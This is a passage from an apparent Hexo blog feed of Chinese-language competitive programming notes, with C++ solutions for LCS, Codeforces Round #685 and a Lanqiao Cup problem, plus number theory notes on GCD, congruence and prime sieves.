c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;string&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;cstring&gt;</span></span><br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">1000</span>;<br><span class="hljs-type">int</span> c[N+<span class="hljs-number">5</span>][N+<span class="hljs-number">5</span>];<br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">lcs</span><span class="hljs-params">(string X, string Y)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> m=X.<span class="hljs-built_in">length</span>();<br><span class="hljs-type">int</span> n=Y.<span class="hljs-built_in">length</span>();<span class="hljs-comment">//也可.size()</span><br><span class="hljs-type">int</span> maxl=<span class="hljs-number">0</span>;<br>X=<span class="hljs-string">&#x27; &#x27;</span>+X;<br>Y=<span class="hljs-string">&#x27; &#x27;</span>+Y;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=m;i++)c[i][<span class="hljs-number">0</span>]=<span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">1</span>;j&lt;=n;j++)c[<span class="hljs-number">0</span>][j]=<span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=m;i++)<br>&#123;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">1</span>;j&lt;=n;j++)<br>&#123;<br><span class="hljs-keyword">if</span>(X[i]==Y[j])<br>&#123;<br>c[i][j]=c[i<span class="hljs-number">-1</span>][j<span class="hljs-number">-1</span>]+<span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>c[i][j]=<span class="hljs-built_in">max</span>(c[i<span class="hljs-number">-1</span>][j], c[i][j<span class="hljs-number">-1</span>]);<br>&#125;<br>maxl=<span class="hljs-built_in">max</span>(maxl, c[i][j]);<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> maxl;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>string s1,s2;<br><span class="hljs-type">int</span> n;<br>cin&gt;&gt;n;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>&#123;<br>cin&gt;&gt;s1&gt;&gt;s2;<br>cout&lt;&lt;<span class="hljs-built_in">lcs</span>(s1,s2)&lt;&lt;endl;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ACM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ACM-CodeForces-#685(Div.2)</title>
      <link href="/2020/11/e1e96252.html"/>
      <url>/2020/11/e1e96252.html</url>
      
        <content type="html"><![CDATA[<p>好久没见过CF有这么水的contest了，蒟蒻赶紧<del>找找自信</del></p><span id="more"></span><h1 id="A-Subtract-or-Divide"><a href="#A-Subtract-or-Divide" class="headerlink" title="A. Subtract or Divide"></a>A. Subtract or Divide</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br> <br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br> <br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-type">int</span> T,n;<br>cin&gt;&gt;T;<br><span class="hljs-keyword">while</span>(T--)<br>&#123;<br>cin&gt;&gt;n;<br><span class="hljs-keyword">if</span>(n&lt;=<span class="hljs-number">3</span>)n--;<br><span class="hljs-keyword">else</span>n=<span class="hljs-number">2</span>+(n&amp;<span class="hljs-number">1</span>);<br>cout&lt;&lt;n&lt;&lt;endl;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="B-Non-Substring-Subsequence"><a href="#B-Non-Substring-Subsequence" class="headerlink" title="B. Non-Substring Subsequence"></a>B. Non-Substring Subsequence</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;cstring&gt;</span></span><br> <br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br> <br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-type">int</span> T;<br>cin&gt;&gt;T;<br><span class="hljs-keyword">while</span>(T--)<br>&#123;<br><span class="hljs-type">int</span> n,q;<br>string s;<br>cin&gt;&gt;n&gt;&gt;q&gt;&gt;s;<br><span class="hljs-keyword">while</span>(q--)<br>&#123;<br><span class="hljs-type">int</span> l,r;<br><span class="hljs-type">bool</span> good=<span class="hljs-literal">false</span>;<br>cin&gt;&gt;l&gt;&gt;r;<br>l--;<br>r--;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;l &amp;&amp; good==<span class="hljs-literal">false</span>; i++)<br><span class="hljs-keyword">if</span>(s[i]==s[l])good=<span class="hljs-literal">true</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=r+<span class="hljs-number">1</span>;i&lt;n &amp;&amp; good==<span class="hljs-literal">false</span>;i++)<br><span class="hljs-keyword">if</span>(s[i]==s[r])good=<span class="hljs-literal">true</span>;<br><span class="hljs-keyword">if</span>(good==<span class="hljs-literal">true</span>)cout&lt;&lt;<span class="hljs-string">&quot;YES&quot;</span>&lt;&lt;endl;<br><span class="hljs-keyword">else</span>cout&lt;&lt;<span class="hljs-string">&quot;NO&quot;</span>&lt;&lt;endl;<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="C-String-Equality"><a href="#C-String-Equality" class="headerlink" title="C. String Equality"></a>C. String Equality</h1><p>这里有必要记录两个很有意思的小知识点，都是C11标准里面新增的，array数组和auto类型变量，auto类型可以根据你赋值的数据自动分配数据类型，用起来十分方便</p><blockquote><p>array&lt;T,N&gt; 模板定义了一种相当于标准数组的容器类型。它是一个有 N 个 T 类型元素的固定序列。除了需要指定元素的类型和个数之外，它和常规数组没有太大的差别。显然，不能增加或删除元素。</p><p>模板实例的元素被内部存储在标准数组中。和标准数组相比，array 容器的额外幵销很小，但提供了两个优点：如果使用 at()，当用一个非法的索引访问数组元素时，能够被检测到，因为容器知道它有多少个元素，这也就意味着数组容器可以作为参数传给函数，而不再需要单独去指定数组元素的个数。</p><p>使用 array 容器类型时，需要在源文件中包含头文件 array。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;array&gt;</span></span><br> <br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br> <br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-type">int</span> T;<br>cin&gt;&gt;T;<br><span class="hljs-keyword">while</span>(T--)<br>&#123;<br><span class="hljs-type">int</span> n,k;<br>string s1,s2;<br>array&lt;<span class="hljs-type">int</span>, 27&gt; have&#123;&#125;, need&#123;&#125;;<br>cin&gt;&gt;n&gt;&gt;k&gt;&gt;s1&gt;&gt;s2;<br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">auto</span>&amp; c: s1)<br>have[c-<span class="hljs-string">&#x27;a&#x27;</span>]++;<br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">auto</span>&amp; c: s2)<br>need[c-<span class="hljs-string">&#x27;a&#x27;</span>]++;<br><span class="hljs-type">bool</span> good = <span class="hljs-literal">true</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">26</span>;i++)<br>&#123;<br><span class="hljs-keyword">if</span>(have[i]&lt;need[i] || (have[i] -= need[i]) % k)<br>good=<span class="hljs-literal">false</span>;<br>have[i+<span class="hljs-number">1</span>]+=have[i];<br>&#125;<br><span class="hljs-keyword">if</span>(good)cout&lt;&lt;<span class="hljs-string">&quot;Yes&quot;</span>&lt;&lt;endl;<br><span class="hljs-keyword">else</span>cout&lt;&lt;<span class="hljs-string">&quot;No&quot;</span>&lt;&lt;endl;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="D-Circle-Game"><a href="#D-Circle-Game" class="headerlink" title="D.Circle Game"></a>D.Circle Game</h1><p>逻辑题</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br> <br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> T;<br>    cin &gt;&gt; T;<br>    <span class="hljs-keyword">while</span>(T--) &#123;<br>        <span class="hljs-type">int</span> n, k;<br>        cin &gt;&gt; n &gt;&gt; k;<br>        <span class="hljs-type">int</span> x = <span class="hljs-number">0</span>, y = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(;;) <br>&#123;<br>            <span class="hljs-keyword">if</span>(x &lt;= y &amp;&amp; <span class="hljs-built_in">pow</span>(x+k, <span class="hljs-number">2</span>) + <span class="hljs-built_in">pow</span>(y, <span class="hljs-number">2</span>) &lt;= <span class="hljs-built_in">pow</span>(n, <span class="hljs-number">2</span>))<br>                x += k;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(x &gt; y &amp;&amp; <span class="hljs-built_in">pow</span>(y+k, <span class="hljs-number">2</span>) + <span class="hljs-built_in">pow</span>(x, <span class="hljs-number">2</span>) &lt;= <span class="hljs-built_in">pow</span>(n,<span class="hljs-number">2</span>))<br>                y += k;<br>            <span class="hljs-keyword">else</span><span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(x == y)<br>            cout &lt;&lt; <span class="hljs-string">&quot;Utkarsh&quot;</span> &lt;&lt; endl;<br>        <span class="hljs-keyword">else</span><br>            cout &lt;&lt; <span class="hljs-string">&quot;Ashish&quot;</span> &lt;&lt; endl;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ACM </tag>
            
            <tag> CF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ACM-学习记录-数论</title>
      <link href="/2020/11/fb844361.html"/>
      <url>/2020/11/fb844361.html</url>
      
        <content type="html"><![CDATA[<h1 id="GCD，LCM"><a href="#GCD，LCM" class="headerlink" title="GCD，LCM"></a>GCD，LCM</h1><h2 id="定理"><a href="#定理" class="headerlink" title="定理"></a>定理</h2><p>a、b两个数的最大公约数乘以它们最小公倍数等于a和b的乘积</p><p><em><strong>axb&#x3D;GCD(a,b)xLCM(a,b)</strong></em></p><p>据此定理，求3与8的最小公倍数可以为：LCM(3,8)&#x3D;3x8divGCD(3,8)&#x3D;24</p><span id="more"></span><h2 id="欧几里得算法"><a href="#欧几里得算法" class="headerlink" title="欧几里得算法"></a>欧几里得算法</h2><p>构造关系：GCD(a,b)&#x3D;GCD(b, a mod b)</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">gcd</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b)</span> </span><br><span class="hljs-function"></span>&#123; <br> <span class="hljs-keyword">if</span>(b==<span class="hljs-number">0</span>)<br> <span class="hljs-keyword">return</span> a; <br><span class="hljs-keyword">return</span>  <span class="hljs-built_in">gcd</span>(b,a%b); <br>&#125; <br></code></pre></td></tr></table></figure><h2 id="二进制最大公约数算法"><a href="#二进制最大公约数算法" class="headerlink" title="二进制最大公约数算法"></a>二进制最大公约数算法</h2><ol><li><p>递归终止条件：GCD(m,m)&#x3D;m</p></li><li><p>递归关系式：</p><p>m&lt;n时：GCD(m,n)&#x3D;GCD(n,m)</p><p>m为偶数，n为偶数：Gcd(m,n)&#x3D;2*Gcd(m&#x2F;2,n&#x2F;2)<br>m为偶数，n为奇数：Gcd(m,n)&#x3D;Gcd(m&#x2F;2,n)<br>m为奇数，n为偶数：Gcd(m,n)&#x3D;Gcd(m,n&#x2F;2)<br>m为奇数，n为奇数：Gcd(m,n)&#x3D;Gcd(n,m-n)</p></li></ol><h2 id="不定方程的整数解"><a href="#不定方程的整数解" class="headerlink" title="不定方程的整数解"></a>不定方程的整数解</h2><p>方程ax+by&#x3D;c有整数解的充要条件：gcd(a,b) | c</p><p>设d&#x3D;gcd(a,b)</p><p>则若我们求得一组(x0,y0)满足ax0+by0&#x3D;d</p><p>则可以得到原方程的一组解:((x0Xc)&#x2F;d, (y0xc)&#x2F;d)</p><h2 id="扩展欧几里得算法"><a href="#扩展欧几里得算法" class="headerlink" title="扩展欧几里得算法"></a>扩展欧几里得算法</h2><h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h3><p>已知a,b,求解一组x,y，使他们满足贝祖等式[^ax+by&#x3D;gcd(a,b)&#x3D;d](根据数论原理，解一定存在）。常用在求解模线性方程组中，也可以用来求解乘法逆元。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">Int <span class="hljs-title">exGcd</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b,<span class="hljs-type">int</span>&amp; x,<span class="hljs-type">int</span>&amp; y)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">if</span>(b==<span class="hljs-number">0</span>)<br>&#123;<br>x=<span class="hljs-number">1</span>;y=<span class="hljs-number">0</span>;<br><span class="hljs-keyword">return</span> a;<br>&#125;<br><span class="hljs-type">int</span> r=<span class="hljs-built_in">exGcd</span>(b,a%b,x,y);<br><span class="hljs-type">int</span> t=x;x=y;y=t-a/b*y;<br><span class="hljs-keyword">return</span> r;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="勾股数"><a href="#勾股数" class="headerlink" title="勾股数"></a>勾股数</h2><p>勾股数有如下几个性质：</p><ol><li>X,Y,Z一定两两互质</li><li>X,Y一定一奇一偶</li><li>X+Z一定是一个完全平方数</li><li>(Y+Z)&#x2F;2也是一个完全平方数</li><li>XxYxZ一定能被60整除</li></ol><h2 id="应用举例"><a href="#应用举例" class="headerlink" title="应用举例"></a>应用举例</h2><p>​编程求n个（n≤100）正整数Ai（Ai≤30000，1≤i≤n）的最大公约数和最小公倍数。假设解一定在长整数范围内。</p><blockquote><p>先求出两个数的最大公约数（最小公倍数），再和其他数求最大公约数（最小公倍数），只需调用函数n-1次。可以利用欧几里得算法快速实现：gcd(a1,a2,…,an)&#x3D;gcd(gcd(a1,a2,…,an-1),an)</p></blockquote><p>​阶乘问题</p><blockquote><p>​整数n的阶乘n！是从1到n的所有整数的乘积。编程：输入一正整数n（n≤65000），给出n！的值从右至左有多少位连续的零？并输出n！的值从右至左第一个非零位的值。<br>​例如：n&#x3D;5，则5！的值等于120，从右至左有1位连续的0；从右至左第一个非零的值为2。你的输出：<br>​1<br>​2<br>​当n&#x3D;11时，程序应该输出：<br>​2<br>​8</p></blockquote><p>​分析：</p><p>​N!的值从右至左连续零的个数，实际上等于n！中所包含的5的因子的总数，这是因为：2x5&#x3D;10.而n！中包含的2的因子的总数显然比5的因子总数大得多。</p><p>​在去除了所有从右至左连续的零以后，计算n！的最右非零位数值就可以用以下的公式：</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-comment">(axb)</span><span class="hljs-meta">%</span><span class="hljs-number">10</span>=<span class="hljs-comment">(a%10)</span>x<span class="hljs-comment">(b%10)</span><span class="hljs-meta">%</span><span class="hljs-number">10</span><br></code></pre></td></tr></table></figure><h1 id="同余"><a href="#同余" class="headerlink" title="同余"></a>同余</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><blockquote><p>a%m&#x3D;b%m，则称a，b mod m同余</p></blockquote><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>设a，b为两个整数，且它们的差a-b能被某个自然数m所整除，则就称a就模m来说同余于b，或者说a和b关于模m同余，</p><p>​记为：a&#x3D;b （mod m）</p><p>它意味着：a-b&#x3D;mxk（k为整数）</p><h2 id="性质"><a href="#性质" class="headerlink" title="性质"></a>性质</h2><p>对于整数a,b,c和自然数m,n则对模m同余满足：</p><ol><li><p>自反性：a &#x3D; a（mod m）</p></li><li><p>对成性：若a&#x3D;b（mod m），则b &#x3D; a（mod m）</p></li><li><p>传递性：若a&#x3D;b（mod m），b&#x3D;c（mod m），则a&#x3D;c（mod m）</p></li><li><p>同加性：若a&#x3D;b（mod m），则a+c&#x3D;b+c（mod m）</p></li><li><p>同乘性：若a&#x3D;b（mod m），则aXc&#x3D;bXc</p><p>​一般情况，a&#x3D;b（mod m），c&#x3D;d（mod m），则：aXc&#x3D;bXd（mod m）</p></li><li><p>同幂性：若a&#x3D;b（mod m）则a^n&#x3D;b^n(mod m)</p></li><li><p>若a mod p&#x3D;x， a mod q&#x3D;x，p、q互质，则a mod（pXq）&#x3D;x</p><p><em><strong>但是同余不满足同除性，即：a&#x2F;n !&#x3D; b&#x2F;n(mod m)</strong></em></p></li></ol><h1 id="素数"><a href="#素数" class="headerlink" title="素数"></a>素数</h1><h2 id="素数的几个定理"><a href="#素数的几个定理" class="headerlink" title="素数的几个定理"></a>素数的几个定理</h2><h3 id="唯一分解定理"><a href="#唯一分解定理" class="headerlink" title="唯一分解定理"></a>唯一分解定理</h3><p>​若整数a&gt;&#x3D;2,那么a一定可以表示为若干个素数的乘积（唯一的形式），即a&#x3D;p1xp2xp3x…ps(其中pj为素数，称为a的素因子，1&lt;&#x3D;j&lt;&#x3D;s)</p><p>​</p>]]></content>
      
      
      
        <tags>
            
            <tag> ACM </tag>
            
            <tag> 数论 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ACM-学习记录-素数筛</title>
      <link href="/2020/11/91338f8a.html"/>
      <url>/2020/11/91338f8a.html</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>近期发现我NEFU低年级组校赛题目只有模拟+数论，恰恰都是我最不会做的，数论方面反反复复用到的就是素数筛，特在此记录一下，闲来无事自己翻阅当作复习复习，以免被到时候<del>一道题都做不出来</del>菜到巨佬们。</p><h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><p>查找2-N的所有素数，如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//线性筛</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">init</span><span class="hljs-params">()</span> </span>&#123;<br>  phi[<span class="hljs-number">1</span>] = <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">2</span>; i &lt; MAXN; ++i) &#123;<br>    <span class="hljs-keyword">if</span> (!vis[i]) &#123;<br>      phi[i] = i - <span class="hljs-number">1</span>;<br>      pri[cnt++] = i;<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; cnt; ++j) &#123;<br>      <span class="hljs-keyword">if</span> (<span class="hljs-number">1ll</span> * i * pri[j] &gt;= MAXN) <span class="hljs-keyword">break</span>;<br>      vis[i * pri[j]] = <span class="hljs-number">1</span>;<br>      <span class="hljs-keyword">if</span> (i % pri[j]) &#123;<br>        phi[i * pri[j]] = phi[i] * (pri[j] - <span class="hljs-number">1</span>);<br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// i % pri[j] == 0</span><br>        <span class="hljs-comment">// 换言之，i 之前被 pri[j] 筛过了</span><br>        <span class="hljs-comment">// 由于 pri 里面质数是从小到大的，所以 i 乘上其他的质数的结果一定也是</span><br>        <span class="hljs-comment">// pri[j] 的倍数 它们都被筛过了，就不需要再筛了，所以这里直接 break</span><br>        <span class="hljs-comment">// 掉就好了</span><br>        phi[i * pri[j]] = phi[i] * pri[j];<br>        <span class="hljs-keyword">break</span>;<br>      &#125;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>数论确实是想杀了我- -</p>]]></content>
      
      
      
        <tags>
            
            <tag> ACM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>蓝桥杯十一届JavaA组-C++解题</title>
      <link href="/2020/11/1162e7f2.html"/>
      <url>/2020/11/1162e7f2.html</url>
      
        <content type="html"><![CDATA[<p>本人随便乱写，目前正确性未知</p><span id="more"></span><h1 id="C-本质上升序列"><a href="#C-本质上升序列" class="headerlink" title="C.本质上升序列"></a>C.本质上升序列</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">bool</span> access[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>];<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">dfs</span><span class="hljs-params">(<span class="hljs-type">int</span> idx, <span class="hljs-type">int</span> x, <span class="hljs-type">int</span> y)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">if</span>(x&lt;<span class="hljs-number">0</span> || y&lt;<span class="hljs-number">0</span> || x&gt;=<span class="hljs-number">4</span> || y&gt;=<span class="hljs-number">4</span>)<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><span class="hljs-keyword">if</span>(access[y][x])<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><span class="hljs-keyword">if</span>(idx&gt;=<span class="hljs-number">15</span>)<span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br><span class="hljs-type">int</span> count=<span class="hljs-number">0</span>;<br>access[y][x]=<span class="hljs-literal">true</span>;<br>count+=<span class="hljs-built_in">dfs</span>(idx+<span class="hljs-number">1</span>, x+<span class="hljs-number">1</span>, y);<br>count+=<span class="hljs-built_in">dfs</span>(idx+<span class="hljs-number">1</span>, x, y+<span class="hljs-number">1</span>);<br>count+=<span class="hljs-built_in">dfs</span>(idx+<span class="hljs-number">1</span>, x<span class="hljs-number">-1</span>, y);<br>count+=<span class="hljs-built_in">dfs</span>(idx+<span class="hljs-number">1</span>, x, y<span class="hljs-number">-1</span>);<br>access[y][x]=<span class="hljs-literal">false</span>;<br><span class="hljs-keyword">return</span> count;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br><br><span class="hljs-type">int</span> count =<span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span 